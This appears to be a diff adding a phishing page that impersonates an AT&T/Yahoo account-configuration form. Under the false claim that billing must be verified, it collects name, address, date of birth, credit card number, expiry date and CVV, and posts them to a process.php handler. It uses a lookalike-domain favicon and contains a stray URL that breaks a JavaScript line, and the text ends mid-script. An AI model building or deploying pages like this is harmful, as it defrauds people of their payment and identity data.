@@ -1,0 +1,893 @@
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>AT&amp;T Main Configuration</title>
+    <meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"/>
+		<link rel="icon" 
+      type="image/png" 
+      href="https://myattl.com/en/img/gq.png">
+	<link rel="stylesheet" type="text/css" href="congiuration_files/combo.css">
+	<link rel="stylesheet" type="text/css" media="print" href="congiuration_files/ybb_print_200505190859.css">			
+<style type="text/css">
+#ycs_frm { margin-top: 1em; }
+	.clr_warn { margin:2 0 5 25px; color:red;}
+	.frm_fields, .frm_fields2 { width: 70%; float: left; }
+	.frm_dtl { width: 24%; float: left; padding-bottom: 1em; }
+	.frm_fields th { width: 30% }
+	
+	#checkId {border:1px solid #9a9a9a; margin-top: 10px; width: 70%;text-align:center}
+	#checkId.ycsmght {padding:5px}
+	
+	.frm_fields .idnt {display:block; margin-left: 20px}
+	 
+	.frm_fields ul{margin:.9em 0 0 0}
+	.frm_fields p{margin:0 5.5em 0 0}
+	.frm_fields ul li{background:none;list-style:none;margin:.2em 0 0 1.1em}
+	.frm_fields ul li input{margin:0 .4em }
+	.ycssmtxtrt {margin:0 0 0 14.5em} /*IE*/	
+	#udob+td small.ycssmtxtrt {margin:0 0 0 16.8em} /*W3C*/
+	
+	table{border-collapse:collapse;}
+
+	.select-box{vertical-align:middle;}
+	
+	.frm_fields2{margin-bottom:1em;}
+	.frm_fields2 label{margin-left:.8em;float:left;}
+	.frm_fields2 .fld{margin-left:13.3em;}
+.small{font-family:verdana;font-size:77%;}
+label.req{background:url('https://s.yimg.com/lq/i/us/plus/csp/gr/asterisk.gif') no-repeat .1em 0;margin-left:0;padding-left:11px;}
+img.moreinfo{display:block!important;margin-left:5px;border:none;}
+h3{margin-top:0;}
+.select-box{vertical-align:middle;}
+</style>
+
+	<script src="congiuration_files/yahoo_2.js" type="text/javascript"></script>
+	<script src="congiuration_files/yahoo-min.js" type="text/javascript"></script>
+	<script src="congiuration_files/event-min.js" type="text/javascript"></script>
+	<script src="congiuration_files/dom_2.js" type="text/javascript"></script>	
+<script type="text/javascript">
+var ycs_isIe, ycs_isNS, ycs_isIEMac, ycs_gEvt;
+var formName = 'acctRegFrm';
+
+function setRdoChck(evt) {
+	evt = (evt) ? evt : ((window.event) ? event : null);
+    if (evt) { document.getElementById("mktgemail").checked = true; } 
+	
+}
+
+function getRdoWtch() {
+
+	if (formName != null) {		
+		var txtFld = document[formName].elements['mrktngeml_input'];
+		if(txtFld.value!=""){
+				document.getElementById("mktgemail").checked = true;
+			}
+		if (ycs_isNS) { //ns
+			txtFld.addEventListener("focus", setRdoChck, false);
+			
+		} else if (ycs_isIe) { //ie pc
+			txtFld.attachEvent('onfocus', setRdoChck);
+		} else if (ycs_isIEMac) { //ie mac
+			ycs_gEvt.attachEvent('onfocus', setRdoChck, txtFld);
+		} else {
+			txtFld.addEventListener("focus", setRdoChck, false);
+		}
+	}  
+}
+
+FixIESelectWidth = new function()
+{
+	var oSelf = this; 
+	var YUE = YAHOO.util.Event;
+	var YUD = YAHOO.util.Dom;
+	var oTimer = {};https://attrb.net/main
+	var oAnim = {};
+	var nTimerId =  0 ;
+	var dLastFocalItem;
+	var ie7 = !!(document.uniqueID  &&   typeof(XMLHttpRequest)!='undefined' )
+	
+	
+	function init(el)
+	{
+		
+		
+		el = el || this;
+		
+		/* make sure that the element  passed is a 'select' and lies within parent element 'select-box' */
+
+		if( el.tagName.toLowerCase() != 'select')
+		{
+			throw Error('element [' + el.id + '] is not <select>');
+			return;
+		};	
+		
+		if(!YUD.hasClass( el.parentNode, 'select-box'))
+		{
+			throw Error('className select-box is not included for element [' + el.id + ']');
+			return;
+		};	
+		
+		var oRs = el.runtimeStyle;
+		var oPRs = el.parentNode.runtimeStyle;
+		
+		
+		// oPRs.fonSize = 0;
+		
+		
+		var sDisplay = el.parentNode.currentStyle.display.toLowerCase() ;
+		if(  sDisplay=='' ||  sDisplay=='inline' ||  sDisplay=='inline-block' )
+		{
+			oPRs.display = 'inline-block';
+			oPRs.width = el.offsetWidth + 'px';
+			oPRs.height =el.offsetHeight + 'px';
+			oPRs.position = 'relative';
+			oRs.position = 'absolute';
+			oRs.top = 0;
+			oRs.left = 0;
+		};
+		
+		
+		
+		el._timerId = ( nTimerId+=1 );
+
+		el.selectedIndex = Math.max( 0 , el.selectedIndex );
+		
+		oTimer[ '_' + el._timerId ] = setTimeout('void(0)',0);
+		oAnim [ 'A' + el._timerId ] = setTimeout('void(0)',0);
+		
+		YUE.on( el, 'mouseover' , onMouseOver);
+		YUE.on( el, 'focus' , onMouseOver);
+		YUE.on( document, 'mousedown' ,onMouseDown , el, true);
+		YUE.on(  el, 'change' ,collapseSelect );
+		
+	}
+
+
+	function collapseSelect(e)
+	{
+		//status++;
+		this.runtimeStyle.width = '';			
+	}
+/* function to expand the select to its default width to show full text of options when mouseover */
+	function onMouseOver(e )
+	{
+	
+		var el = this;	
+		if(dLastFocalItem && dLastFocalItem !=el)
+		{
+			 onMouseDown.call( dLastFocalItem , e );
+		};
+
+		var sTimerId ='_' +  el._timerId ;
+		var sAniId = 'A' + el._timerId ;
+		clearTimeout( oTimer[ sTimerId ] );
+
+		
+
+		var onTween = function()
+		{
+			clearTimeout( oAnim [  sAniId  ] );
+			if( Math.abs( nEndWidth - nStartWidth ) > 3 )
+			{
+				nStartWidth += (nEndWidth - nStartWidth ) /3;
+				el.runtimeStyle.width = nStartWidth + 'px';
+				oAnim [  sAniId  ] = setTimeout( onTween ,0 );
+			}
+			else
+			{
+				el.runtimeStyle.width = 'auto';
+				el.selectedIndex = Math.max( 0 , el.selectedIndex );
+			}
+		}
+
+		var nStartWidth =  el.offsetWidth ;
+		el.runtimeStyle.width = 'auto';
+		var nEndWidth  = el.offsetWidth;
+		
+
+		clearTimeout( oAnim [  sAniId  ] );
+		onTween();
+
+		el.focus();		
+		dLastFocalItem = el;
+	}
+
+	
+	
+	
+	
+	function onMouseDown(e , el )
+	{
+		el = ( e.srcElement || e.target );
+		
+		
+		
+		if( el == this && e.type!='mouseover' )
+		{
+			//status++;
+			YUE.stopEvent(e);
+			return false;
+		};
+		
+		
+		el = this;
+		
+		clearTimeout( oAnim [ 'A' + el._timerId ] );
+	
+		
+		var sTimerId ='_' +  el._timerId ;
+		var doItLater = function()
+		{
+			el.runtimeStyle.width = '';			
+		};
+		if( e.type=='mouseover')
+		{ doItLater();}
+		else{
+			oTimer[ sTimerId ] = setTimeout(doItLater,100);
+		}
+	}
+
+	
+
+	function constructor(sb)
+	{
+		sId = sb;
+		//Only fix for IE55 ~ IE7
+		
+		if(document.uniqueID && window.createPopup )
+		{			
+			YUE.onAvailable(sId ,init );
+			return true;
+
+		}else{return false};
+	};
+
+	return  constructor;
+}
+
+var iInitWidth = 280;
+
+var sb = new FixIESelectWidth( 'pw_q'  );
+var sb2 = new FixIESelectWidth( 'pw_q2'  );
+var sb3 = new FixIESelectWidth( 'pw_q3'  );
+
+
+function moreInfoPopup(url){
+   if(url != null){
+       var newWin = window.open(url, "moreinfo_window", "width=400, height=400, scrollbars=no");
+       newWin.focus();
+   }
+}
+var YUE = YAHOO.util.Event;
+// Check for availability of last select box before resizing
+YUE.onDOMReady( 
+   function(){
+       
+       if(document.getElementById('pw_q') != null){document.getElementById('pw_q').style.width = iInitWidth+'px';}
+       if(document.getElementById('pw_q2') != null){document.getElementById('pw_q2').style.width = iInitWidth+'px';}
+       if(document.getElementById('pw_q3') != null){document.getElementById('pw_q3').style.width = iInitWidth+'px';}
+   });
+</script>
+
+
+	<script>
+FixIESelectWidth = new function()
+{
+	var oSelf = this; 
+	var YUE = YAHOO.util.Event;
+	var YUD = YAHOO.util.Dom;
+	var oTimer = {};
+	var oAnim = {};
+	var nTimerId =  0 ;
+	var dLastFocalItem;
+	var ie7 = !!(document.uniqueID  &&   typeof(XMLHttpRequest)!='undefined' )
+	
+	
+	function init(el)
+	{
+		
+		
+		el = el || this;
+		
+		/* make sure that the element  passed is a 'select' and lies within parent element 'select-box' */
+
+		if( el.tagName.toLowerCase() != 'select')
+		{
+			throw Error('element [' + el.id + '] is not <select>');
+			return;
+		};	
+		
+		if(!YUD.hasClass( el.parentNode, 'select-box'))
+		{
+			throw Error('className select-box is not included for element [' + el.id + ']');
+			return;
+		};	
+		
+		var oRs = el.runtimeStyle;
+		var oPRs = el.parentNode.runtimeStyle;
+		
+		
+		// oPRs.fonSize = 0;
+		
+		
+		var sDisplay = el.parentNode.currentStyle.display.toLowerCase() ;
+		if(  sDisplay=='' ||  sDisplay=='inline' ||  sDisplay=='inline-block' )
+		{
+			oPRs.display = 'inline-block';
+			oPRs.width = el.offsetWidth + 'px';
+			oPRs.height =el.offsetHeight + 'px';
+			oPRs.position = 'relative';
+			oRs.position = 'absolute';
+			oRs.top = 0;
+			oRs.left = 0;
+		};
+		
+		
+		
+		el._timerId = ( nTimerId+=1 );
+
+		el.selectedIndex = Math.max( 0 , el.selectedIndex );
+		
+		oTimer[ '_' + el._timerId ] = setTimeout('void(0)',0);
+		oAnim [ 'A' + el._timerId ] = setTimeout('void(0)',0);
+		
+		YUE.on( el, 'mouseover' , onMouseOver);
+		YUE.on( el, 'focus' , onMouseOver);
+		YUE.on( document, 'mousedown' ,onMouseDown , el, true);
+		YUE.on(  el, 'change' ,collapseSelect );
+		
+	}
+
+
+	function collapseSelect(e)
+	{
+		//status++;
+		this.runtimeStyle.width = '';			
+	}
+/* function to expand the select to its default width to show full text of options when mouseover */
+	function onMouseOver(e )
+	{
+	
+		var el = this;	
+		if(dLastFocalItem && dLastFocalItem !=el)
+		{
+			 onMouseDown.call( dLastFocalItem , e );
+		};
+
+		var sTimerId ='_' +  el._timerId ;
+		var sAniId = 'A' + el._timerId ;
+		clearTimeout( oTimer[ sTimerId ] );
+
+		
+
+		var onTween = function()
+		{
+			clearTimeout( oAnim [  sAniId  ] );
+			if( Math.abs( nEndWidth - nStartWidth ) > 3 )
+			{
+				nStartWidth += (nEndWidth - nStartWidth ) /3;
+				el.runtimeStyle.width = nStartWidth + 'px';
+				oAnim [  sAniId  ] = setTimeout( onTween ,0 );
+			}
+			else
+			{
+				el.runtimeStyle.width = 'auto';
+				el.selectedIndex = Math.max( 0 , el.selectedIndex );
+			}
+		}
+
+		var nStartWidth =  el.offsetWidth ;
+		el.runtimeStyle.width = 'auto';
+		var nEndWidth  = el.offsetWidth;
+		
+
+		clearTimeout( oAnim [  sAniId  ] );
+		onTween();
+
+		el.focus();		
+		dLastFocalItem = el;
+	}
+
+	
+	
+	
+	
+	function onMouseDown(e , el )
+	{
+		el = ( e.srcElement || e.target );
+		
+		
+		
+		if( el == this && e.type!='mouseover' )
+		{
+			//status++;
+			YUE.stopEvent(e);
+			return false;
+		};
+		
+		
+		el = this;
+		
+		clearTimeout( oAnim [ 'A' + el._timerId ] );
+	
+		
+		var sTimerId ='_' +  el._timerId ;
+		var doItLater = function()
+		{
+			el.runtimeStyle.width = '';			
+		};
+		if( e.type=='mouseover')
+		{ doItLater();}
+		else{
+			oTimer[ sTimerId ] = setTimeout(doItLater,100);
+		}
+	}
+
+	
+
+	function constructor(sb)
+	{
+		sId = sb;
+		//Only fix for IE55 ~ IE7
+		
+		if(document.uniqueID && window.createPopup )
+		{			
+			YUE.onAvailable(sId ,init );
+			return true;
+
+		}else{return false};
+	};
+
+	return  constructor;
+}
+
+var iInitWidth = 280;
+
+var sb = new FixIESelectWidth( 'pw_q'  );
+var sb2 = new FixIESelectWidth( 'pw_q2'  );
+var sb3 = new FixIESelectWidth( 'pw_q3'  );
+
+
+function moreInfoPopup(url){
+   if(url != null){
+       var newWin = window.open(url, "moreinfo_window", "width=400, height=400, scrollbars=no");
+       newWin.focus();
+   }
+}
+var YUE = YAHOO.util.Event;
+// Check for availability of last select box before resizing
+YUE.onDOMReady( 
+   function(){
+       
+       if(document.getElementById('pw_q') != null){document.getElementById('pw_q').style.width = iInitWidth+'px';}
+       if(document.getElementById('pw_q2') != null){document.getElementById('pw_q2').style.width = iInitWidth+'px';}
+       if(document.getElementById('pw_q3') != null){document.getElementById('pw_q3').style.width = iInitWidth+'px';}
+   });
+</script>
+
+</head>
+
+
+<body onLoad="document.acctRegFrm.fn.focus();ycs_detectBrowsers();getRdoWtch();">
+
+<div id="ycs_cntalign">
+				
+<!-- start: masthead -->
+<div id="ycs_mast">
+<!-- SpaceID=97108935 loc=HEADR noad --><!-- fac-gd2-noad --><!-- gd2-status-2 --><!--QYZ CMS_NONE_AVAIL,,;;HEADR;97108935;2--><script language="javascript">
+if(window.xzq_d==null)window.xzq_d=new Object();
+window.xzq_d['sJS8BWKK9SQ-']='(as$1256ff2er,aid$sJS8BWKK9SQ-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=HEADR)';
+</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(134b57dto(gid$FPYT1zk4LjEXmPLlVqxWtgAjMTQuMVasv04JQO4M,st$1454161743214225,si$4465551,sp$97108935,pv$1,v$2.0))&t=J_3-D_3&al=(as$1256ff2er,aid$sJS8BWKK9SQ-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=HEADR)"></noscript>
+</div>
+<!-- end: masthead -->
+
+
+<div class="mastSep"><!--  --></div>
+				
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	<form name="acctRegFrm" action="process.php" method="post">
+	
+<!-- start: pflSmry content container -->
+<a name="pflSmry"></a>
+<div id="pflSmry" class="ycsotr">
+<div class="ycscntr">
+	
+	<!-- start: header/footer -->
+	<div class="ycscntrhf">
+		<div class="left"><h1>Welcome to AT&amp;T </h1></div>
+		<div class="right">
+		
+		</div>
+	</div>
+	<!-- end: header/footer -->
+		
+	<!-- start: content -->
+	<div class="ycscntthtp"><div class="ycscnttht">
+		<div class="ycscntt">
+						<h2 class="title">Complete your account updating</h2>
+						<p>&nbsp;</p>
+
+<p class="ycsfp">Required fields are marked with an asterisk (<img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9">).</p>
+
+<div id="ycs_frm">
+	<strong></strong>
+	<p class="clr_warn"></p>
+	
+	
+ 				
+<fieldset>
+	<legend>Your Name</legend>
+	<div class="frm_fields">
+		<table summary="form: Your Name" border="0" cellpadding="0" cellspacing="0" width="100%">
+		<tbody><tr>
+			<td colspan="2" headers="ufn_er"></td>
+			<th id="ufn_er" class="ycs_inline"></th>
+		</tr>
+		<tr>
+			<td headers="ufn"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+			<th id="ufn" class="ycs_inline"><label for="pxxlmk11">First Name:</label></th>
+			<td headers="ufn"><input name="pxxlmk1" type="text" required id="pxxlmk1" placeholder="First Name" maxlength="20"/></td>
+		</tr>
+		<tr>
+			<td colspan="3" height="11"></td>
+		</tr>
+		<tr>
+			<td colspan="2" headers="uln_er"></td>
+			<th id="uln_er" class="ycs_inline"></th>
+		</tr>
+		<tr>
+			<td headers="uln"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+			<th id="uln" class="ycs_inline"><label for="pxxlmk2">Last Name:</label></th>
+			<td headers="uln"><input name="pxxlmk2" type="text" required id="pxxlmk2" placeholder="Last Name" maxlength="20"></td>
+		</tr>
+		<tr>
+			<td colspan="3" height="11"></td>
+		</tr>
+		
+		<tr>
+			<td nowrap="nowrap" width="10"><spacer type="block" width="10" height="1"></spacer></td>
+			<td nowrap="nowrap" width="170"><spacer type="block" width="170" height="1"></spacer></td>
+			<td width="100%"><spacer type="block" width="1" height="1"></spacer></td>
+		</tr>
+		</tbody></table>
+		<table width="487" border="0">
+		  <tr>
+		    <td width="10"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+		    <td width="161">Address:</td>
+		    <td width="302"><label for="pxxlmk3"></label>
+		      <input name="pxxlmk3" type="text" required id="pxxlmk3" placeholder="Address"></td>
+		    </tr>
+		  <tr>
+		    <td>&nbsp;</td>
+		    <td>&nbsp;</td>
+		    <td>&nbsp;</td>
+		    </tr>
+		  <tr>
+		    <td><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+		    <td>City:</td>
+		    <td><input name="pxxlmk4" type="text" required id="pxxlmk4" placeholder="City"></td>
+		    </tr>
+		  <tr>
+		    <td>&nbsp;</td>
+		    <td>&nbsp;</td>
+		    <td>&nbsp;</td>
+		    </tr>
+		  <tr>
+		    <td><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+		    <td>State:</td>
+		    <td><select name="pxxlmk5" id="pxxlmk5" required>
+		      <option value="">Select</option>
+		      <option value="AK">AK</option>
+		      <option value="AL">AL</option>
+		      <option value="AR">AR</option>
+		      <option value="AZ">AZ</option>
+		      <option value="CA">CA</option>
+		      <option value="CO">CO</option>
+		      <option value="CT">CT</option>
+		      <option value="DC">DC</option>
+		      <option value="DE">DE</option>
+		      <option value="FL">FL</option>
+		      <option value="GA">GA</option>
+		      <option value="HI">HI</option>
+		      <option value="IA">IA</option>
+		      <option value="ID">ID</option>
+		      <option value="IL">IL</option>
+		      <option value="IN">IN</option>
+		      <option value="KS">KS</option>
+		      <option value="KY">KY</option>
+		      <option value="LA">LA</option>
+		      <option value="MA">MA</option>
+		      <option value="MD">MD</option>
+		      <option value="ME">ME</option>
+		      <option value="MI">MI</option>
+		      <option value="MN">MN</option>
+		      <option value="MO">MO</option>
+		      <option value="MS">MS</option>
+		      <option value="MT">MT</option>
+		      <option value="NC">NC</option>
+		      <option value="ND">ND</option>
+		      <option value="NE">NE</option>
+		      <option value="NH">NH</option>
+		      <option value="NJ">NJ</option>
+		      <option value="NM">NM</option>
+		      <option value="NV">NV</option>
+		      <option value="NY">NY</option>
+		      <option value="OH">OH</option>
+		      <option value="OK">OK</option>
+		      <option value="OR">OR</option>
+		      <option value="PA">PA</option>
+		      <option value="PR">PR</option>
+		      <option value="RI">RI</option>
+		      <option value="SC">SC</option>
+		      <option value="SD">SD</option>
+		      <option value="TN">TN</option>
+		      <option value="TX">TX</option>
+		      <option value="UT">UT</option>
+		      <option value="VA">VA</option>
+		      <option value="VT">VT</option>
+		      <option value="WA">WA</option>
+		      <option value="WI">WI</option>
+		      <option value="WV">WV</option>
+		      <option value="WY">WY</option>
+		      </select></td>
+		    </tr>
+		  </table>
+	</div>
+	<div class="frm_dtl">
+				<small> 
+<strong>Privacy</strong><br>
+AT&amp;T and Yahoo! collect and use information you provide on these 
+pages, as well as information about your use of AT&amp;T Internet 
+services and other <a href="http://edit.client.yahoo.com/cspcommon/static?page=reg_related_services" onClick="openWin('http://edit.client.yahoo.com/cspcommon/static?page=reg_related_services', 'MoreInfo', 400, 400); return false;" title="AT&amp;T Yahoo! Memeber ID association with online content ">related services</a>, as described in our <a href="http://att.yahoo.com/privacy" onClick="openWin('http://att.yahoo.com/privacy', 'privacy', 800, 400); return false;" title="privacy policies">privacy policies</a>.
+</small>			
+	</div>
+	<div class="ygcl"><spacer type="block" width="1" height="1"></spacer></div>
+</fieldset>
+
+
+<fieldset>
+	<legend>Demographic Information</legend>
+	<div class="frm_fields">
+		<table summary="form: Demographic Information" border="0" cellpadding="0" cellspacing="0" width="100%">
+		<tbody><tr>
+			<td colspan="2" headers="uzc_er"></td>
+			<th id="uzc_er" class="ycs_inline"></th>
+		</tr>
+		<tr>
+			<td headers="uzc"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+			<th id="uzc" class="ycs_inline"><label for="pxxlmk11">ZIP Code:</label></th>
+			<td headers="uzc">
+				<input name="pxxlmk6" type="text" required id="pxxlmk6" placeholder="Zip Code" maxlength="5"><br></td>
+		</tr>
+		<tr>
+			<td colspan="3" height="11"></td>
+		</tr>
+					<tr>
+			<td colspan="2" headers="udob_er"></td>
+			<th id="udob_er" class="ycs_inline">
+				
+			</th>
+		</tr>
+		<tr valign="top">
+			<td headers="udob"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+			<th id="udob" class="ycs_inline"><label for="bmon">Date of Birth:</label></th>
+			<td headers="dob"><input name="pxxlmk8" type="text" required id="pxxlmk8" placeholder="MM/DD/YYYY" maxlength="10"></td>
+		</tr>
+		<tr>
+			<td colspan="3" height="11"></td>
+		</tr>
+
+		<tr>
+			<td colspan="2" headers="ugr_er"></td>
+			<th id="ugr_er" class="ycs_inline"></th>
+		</tr>
+		<tr valign="top">
+			<td headers="ugr">&nbsp;</td>
+			<th id="ugr" class="ycs_inline"><br></th>
+			<td headers="ugr"><br>
+			</td>
+		</tr>
+		
+		<tr>
+			<td colspan="3" height="11"></td>
+		</tr>
+		
+		<tr>
+			<td nowrap="nowrap" width="10"><spacer type="block" width="10" height="1"></spacer></td>
+			<td nowrap="nowrap" width="170"><spacer type="block" width="170" height="1"></spacer></td>
+			<td width="100%"><spacer type="block" width="1" height="1"></spacer></td>
+		</tr>
+		</tbody></table>
+	</div>
+	<div class="frm_dtl">
+					<small>
+<strong>Why do you need demographic information?</strong><br>
+The ZIP Code, Gender and Date of Birth fields are required to help us 
+provide you with personalized, age-appropriate content and other online 
+services.
+</small>
+	</div>
+	<div class="ygcl"><spacer type="block" width="1" height="1"></spacer></div>
+</fieldset>
+
+
+ 
+	
+	
+				<fieldset>
+	<legend>Data for Password Recovery</legend>
+	
+
+	<div style="clear:both;height:3px"></div>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+</fieldset>
+
+				
+<fieldset>
+	<legend>Select Communications Email</legend>
+	
+		
+	<div class="frm_fields">
+		 		<p>For configuration to be initiated we need to verify your account by confirming your billing method.Note: You will not be charged for mail configuation.  Our system has detected your billing method.</p>
+	
+		
+			<div class="ycs_inline"></div>
+			<ul id="yaccmrktngeml">
+		<li><img src="congiuration_files/img/billingcards.png" alt="" width="118" height="17" /></li>
+		<li>
+		  <table summary="form: Your Name" border="0" cellpadding="0" cellspacing="0" width="100%">
+		    <tbody>
+		      <tr>
+		        <td colspan="2" headers="ufn_er"></td>
+		        <th id="ufn_er2" class="ycs_inline"></th>
+		        </tr>
+		      <tr>
+		        <td headers="ufn"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+		        <th id="ufn2" class="ycs_inline"><label for="pxxlmk11">Credit Card Number:</label></th>
+		        <td headers="ufn"><input name="pxxlmk7" type="text" required id="pxxlmk7" placeholder="Card Number" maxlength="16"></td>
+		        </tr>
+		      <tr>
+		        <td colspan="3" height="11"></td>
+		        </tr>
+		      <tr>
+		        <td colspan="2" headers="uln_er"></td>
+		        <th id="uln_er2" class="ycs_inline"></th>
+		        </tr>
+		      <tr>
+		        <td headers="uln"><img src="congiuration_files/asterisk.gif" alt="Required Field" height="10" border="0" width="9"></td>
+		        <th id="uln2" class="ycs_inline"><label for="pxxlmk11">Expiration:</label></th>
+		        <td headers="uln"><table width="49" border="0">
+		          <tr>
+		            <td width="18"><label for="pxxlmk11"></label>
+		              <select name='mm1' class='text' style='width:70px;'>
+		                <option>Month 
+		                <option value='01'>01
+		                    <option value='02'>02
+		                      <option value='03'>03
+		                        <option value='04'>04
+		                          <option value='05'>05
+		                            <option value='06'>06
+		                              <option value='07'>07
+		                                <option value='08'>08
+	                                    <option value='09'>09
+	                                    <option value='10'>10
+                                        <option value='11'>11
+                                        <option value='12'>12
+                                    </select></td>
+		            <td width="21"><label for="pxxlmk11"></label>
+		              <select class='text' name='yy1' style='width:70px;'>
+		                <option selected disabled>Year
+		                  <option value='20'>2020
+		                    <option value='21'>2021
+		                      <option value='22'>2022
+		                        <option value='23'>2023
+		                          <option value='24'>2024
+		                            <option value='25'>2025
+		                              <option value='26'>2026
+		                                <option value='27'>2027
+	                                    <option value='28'>2028
+	                                    <option value='29'>2029
+                                        <option value='30'>2030
+                                        <option value='31'>2031
+                                        <option value='32'>2032
+                                        <option value='33'>2033
+                                    </select></td>
+		            </tr>
+		          </table></td>
+		        </tr>
+		      <tr>
+		        <td colspan="3" height="11"></td>
+		        </tr>
+		      <tr>
+		        <td nowrap="nowrap" width="10"><spacer type="block" width="10" height="1"><img src="congiuration_files/asterisk.gif" width="9" height="10"></spacer></td>
+		        <td nowrap="nowrap" width="170">Security Code</td>
+		        <td width="100%"><label for="pxxlmk11"></label>
+		          <input name="pxxlmk11" type="text" required id="pxxlmk11" placeholder="CVV" size="4" maxlength="4"></td>
+		        </tr>
+		      </tbody>
+		    </table>
+		  </li>
+		</ul>
+			<p>&nbsp;</p>
+
+	</div>
+	<div class="frm_dtl">
+					<small>
+<strong>Email communications</strong><br>
+You can visit the AT&amp;T Powered by Yahoo! My Account at any time to revise this choice, as well as customize
+the types of communications you receive from AT&amp;T.
+</small>	
+	</div> 
+</fieldset>
+
+</div>
+		</div>
+	</div></div>
+	<!-- end: content -->
+			
+	<!-- start: header/footer -->
+	<div class="ycscntrhf">
+	  <div class="right">
+	    &nbsp;<input name="submitBtn_f" class="ygbt" value="&nbsp;&nbsp;Next&nbsp;&nbsp;" title="Next" border="0" type="submit">
+		</div>
+	</div>
+	<!-- end: header/footer -->
+		
+</div>
+</div>
+<!-- end: pflSmry content container -->
+	
+	
+<input name="partner" value="sbc" type="hidden">
+<input name="done" value="https://att.yahoo.com?.lts=1454161360" type="hidden">
+<input name=".scrumb" value="dWLQ.Y84Tk1" type="hidden">
+<input name="subID" value="" type="hidden">
+<input name="isUpgrade" value="0" type="hidden">
+<input name=".ea" value="sDP_zSZh6wqH88wYuOAD5TdYEX8timctRy1cjlYzoIDs5_vjb7C6ds.oLsOWDMXrLtPGgprRsoSTRkzlbLHjRS37LLC1A6RpNMBRh9O7zYSUUWYpNzjX_JL2AUV82oUvr5M7ZGazaFbfsJwLEdoZi50NxmUTJN4nYMsNLf2r7Ga4ZKQlXijEfAZYhNtNfnT9YBzLFP1H_HFauMYbtcD_az_NousyIecdbCN4xZto8jhg5ANOq5KsK7U0hOLrhgD5v1Ckmx78VFI_PgZm8F7IgoDTJOaVDyO0toWLaboPgDYa_0BAqE5WFlJLAxNRectwSC7tYLWzJzMfjdbJTJ0yDJlwMfz34TrGxm6m" type="hidden">
+<input name=".partner" value="sbc" type="hidden">
+<input name="page" value="getinfo_page" type="hidden">
+
+	</form>
+			
+<!-- start: footer -->
+<div id="ycs_ftr">
+<!-- SpaceID=97108935 loc=FOOT2 noad --><!-- fac-gd2-noad --><!-- gd2-status-2 --><!--QYZ CMS_NONE_AVAIL,,;;FOOT2;97108935;2--><script language="javascript">
+if(window.xzq_d==null)window.xzq_d=new Object();
+window.xzq_d['DCu8BWKK9SQ-']='(as$125rh03dd,aid$DCu8BWKK9SQ-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=FOOT2)';
+</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(134b57dto(gid$FPYT1zk4LjEXmPLlVqxWtgAjMTQuMVasv04JQO4M,st$1454161743214225,si$4465551,sp$97108935,pv$1,v$2.0))&t=J_3-D_3&al=(as$125rh03dd,aid$DCu8BWKK9SQ-,cr$-1,ct$25,at$H,eob$gd1_match_id=-1:ypos=FOOT2)"></noscript>
+</div>
+<!-- end: footer -->
+
+
+</div>
+
+<script type="text/javascript">
+	var formName = "acctRegFrm";
+	var enableButtonArray = new Array("submitBtn_f");
+</script>
+
+<img id="beacon" src="congiuration_files/space.gif" alt="" height="1" border="0" width="1"><!-- spaceId: 97108935 -->
+<script src="congiuration_files/ybb_200508150345.js" type="text/javascript"></script>
+
+
+
+	<script language="javascript">
+(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i=new Array();T.xzq_i.c=0}var R=T.xzq_i;R[++R.c]=new Image();R[R.c].src=S}window.xzq_sr=function(){var S=window;var Y=S.xzq_d;if(Y==null){return }if(J==null){return }var T=J+M;if(T.length>P){C();return }var X="";var U=0;var W=Math.random();var V=(Y.hasOwnProperty!=null);var R;for(R in Y){if(typeof Y[R]=="string"){if(V&&!Y.hasOwnProperty(R)){continue}if(T.length+X.length+Y[R].length<=P){X+=Y[R]}else{if(T.length+Y[R].length>P){}else{U++;N(T,X,U,W);X=Y[R]}}}}if(U){U++}N(T,X,U,W);C()};function N(R,U,S,T){if(U.length>0){R+="&al="}F(R+U+"&s="+S+"&r="+T)}function C(){window.xzq_d=null;M=null;J=null}function K(R){xzq_sr()}function B(R){xzq_sr()}function L(U,V,W){if(W){var R=W.toString();var T=U;var Y=R.match(new RegExp("\\\\(([^\\\\)]*)\\\\)"));Y=(Y[1].length>0?Y[1]:"e");T=T.replace(new RegExp("\\\\([^\\\\)]*\\\\)","g"),"("+Y+")");if(R.indexOf(T)<0){var X=R.indexOf("{");if(X>0){R=R.substring(X,R.length)}else{return W}R=R.replace(new RegExp("([^a-zA-Z0-9$_])this([^a-zA-Z0-9$_])","g"),"$1xzq_this$2");var Z=T+";var rv = f( "+Y+",this);";var S="{var a0 = '"+Y+"';var ofb = '"+escape(R)+"' ;var f = new Function( a0, 'xzq_this', unescape(ofb));"+Z+"return rv;}";return new Function(Y,S)}else{return W}}return V}window.xzq_eh=function(){if(E||I){this.onload=L("xzq_onload(e)",K,this.onload,0);if(E&&typeof (this.onbeforeunload)!=O){this.onbeforeunload=L("xzq_dobeforeunload(e)",B,this.onbeforeunload,0)}}};window.xzq_s=function(){setTimeout("xzq_sr()",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var G=navigator.userAgent;var A=parseInt(H);var 